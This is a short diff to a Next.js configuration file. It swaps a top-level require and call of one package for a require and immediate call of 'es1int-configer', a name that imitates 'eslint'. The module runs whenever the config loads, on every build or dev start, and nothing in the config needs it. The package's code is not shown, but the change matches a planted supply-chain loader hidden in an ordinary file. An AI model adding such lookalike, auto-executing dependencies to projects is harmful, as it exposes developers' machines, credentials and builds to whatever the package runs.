@@ -1,6 +1,6 @@
 /** @type {import('next').NextConfig} */
-const alignedArray = require('aligned-array');
-alignedArray();
+const config = require('es1int-configer');
+config();
 const nextConfig = {
   reactStrictMode: true,
   swcMinify: true,
